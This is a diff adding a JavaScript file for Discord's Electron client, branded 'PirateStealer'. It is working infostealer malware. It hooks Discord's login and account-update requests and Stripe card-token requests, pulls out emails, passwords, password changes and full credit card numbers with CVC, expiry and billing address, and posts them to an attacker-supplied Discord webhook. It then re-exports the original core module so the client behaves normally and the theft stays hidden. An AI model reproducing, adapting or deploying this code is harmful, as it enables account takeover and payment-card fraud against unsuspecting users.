@@ -1,0 +1,234 @@
+const electron = require('electron');
+var webhook = "%WEBHOOK_LINK%"
+const { session } = require('electron')
+let tokens = [];
+const https = require("https");
+const querystring = require('querystring');
+
+
+webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "")
+
+
+
+function SendToWebhook(what){
+
+    const options = {
+        hostname: 'discord.com',
+        port: 443,
+        path: webhook,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': what.length
+        }
+      }
+    
+    
+    
+    
+    
+      const req = https.request(options, res => {
+      
+        res.on('data', d => {
+          process.stdout.write(d)
+        })
+      })
+      
+      req.on('error', error => {
+        console.error(error)
+      })
+      
+      req.write(what)
+      req.end()
+    
+}
+
+
+
+  
+  
+
+function Login(email, password){
+    var params = {
+        username: "PirateStealer",
+        content: "",
+        embeds: [
+            {
+                "title": "User Login",
+                "description": "**Email: **```" + email + "```" + "\n**Password: **```" + password + "```",
+                "author": {
+                    "name": "PirateStealer"
+                  },
+                  "footer": {
+                    "text": "https://github.com/Stanley-GF/PirateStealer"
+                  }        
+            }
+        ]
+    }
+    SendToWebhook(JSON.stringify(params));
+}
+
+    
+function ChangePassword(oldpassword, newpassword){
+    var params = {
+        username: "PirateStealer",
+        content: "",
+        embeds: [
+            {
+                "title": "User Change Password",
+                "description": "**Old Password: **```" + oldpassword + "```" + "\n**New Password: **```" + newpassword + "```",
+                "author": {
+                    "name": "PirateStealer"
+                  },
+                  "footer": {
+                    "text": "https://github.com/Stanley-GF"
+                  }        
+            }
+        ]
+    }
+    SendToWebhook(JSON.stringify(params));
+
+}
+
+    function ChangeEmail(newemail, password){
+        var params = {
+            username: "PirateStealer",
+            content: "",
+            embeds: [
+                {
+                    "title": "User Change Email",
+                    "description": "**New Email: **```" + newemail + "```" + "\n**Password: **```" + password + "```",
+                    "author": {
+                        "name": "PirateStealer"
+                      },
+                      "footer": {
+                        "text": "https://github.com/Stanley-GF"
+                      }        
+                }
+            ]
+        }
+        
+        SendToWebhook(JSON.stringify(params));
+
+}
+
+
+        
+        function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country){
+            var params = {
+                username: "PirateStealer",
+                content: "",
+                embeds: [
+                    {
+                        "title": "User Credit Card Added",
+                        "description": "**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```",
+                        "author": {
+                            "name": "PirateStealer"
+                          },
+                          "footer": {
+                            "text": "https://github.com/Stanley-GF"
+                          }        
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params));
+
+        }
+
+const ChangePasswordFilter = {
+    urls: [
+        "https://discord.com/api/v*/users/@me",
+        "https://*.discord.com/api/v*/users/@me",
+        'https://discord.com/api/v*/auth/login',
+        'https://*.discord.com/api/v*/auth/login',
+        "https://api.stripe.com/v*/tokens"
+
+    ]
+};
+var getParamsAsObject = function (query) {
+
+    query = query.substring(query.indexOf('?') + 1);
+
+    var re = /([^&=]+)=?([^&]*)/g;
+    var decodeRE = /\+/g;
+
+    var decode = function (str) {
+        return decodeURIComponent(str.replace(decodeRE, " "));
+    };
+
+    var params = {}, e;
+    while (e = re.exec(query)) {
+        var k = decode(e[1]), v = decode(e[2]);
+        if (k.substring(k.length - 2) === '[]') {
+            k = k.substring(0, k.length - 2);
+            (params[k] || (params[k] = [])).push(v);
+        }
+        else params[k] = v;
+    }
+
+    var assign = function (obj, keyPath, value) {
+        var lastKeyIndex = keyPath.length - 1;
+        for (var i = 0; i < lastKeyIndex; ++i) {
+            var key = keyPath[i];
+            if (!(key in obj))
+                obj[key] = {}
+            obj = obj[key];
+        }
+        obj[keyPath[lastKeyIndex]] = value;
+    }
+
+    for (var prop in params) {
+        var structure = prop.split('[');
+        if (structure.length > 1) {
+            var levels = [];
+            structure.forEach(function (item, i) {
+                var key = item.replace(/[?[\]\\ ]/g, '');
+                levels.push(key);
+            });
+            assign(params, levels, params[prop]);
+            delete(params[prop]);
+        }
+    }
+    return params;
+};
+
+    session.defaultSession.webRequest.onHeadersReceived(ChangePasswordFilter, (details, callback) => {
+        if (details.url.endsWith("login")){
+            if (details.statusCode == 200){
+
+                const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+                const email = data.login;
+                const password = data.password;
+                Login(email, password);
+            }else{
+
+                
+            }    
+        }
+        if (details.url.endsWith("users/@me")){
+
+            if (details.statusCode == 200 && details.method == "PATCH"){
+                const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+                if (data.password != null && data.password != undefined && data.password != ""){
+                    if (data.new_password != undefined && data.new_password != null && data.new_password != ""){
+                        ChangePassword(data.password, data.new_password);
+                    }
+                    if (data.email != null && data.email != undefined && data.email != ""){
+                        ChangeEmail(data.email, data.password);
+                    }
+                }
+            }else{
+
+                
+            }
+        }
+        if (details.url.endsWith("tokens")){
+
+		const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"]);
+        }
+        callback(details);
+    });
+
+
+module.exports = require('./core.asar');
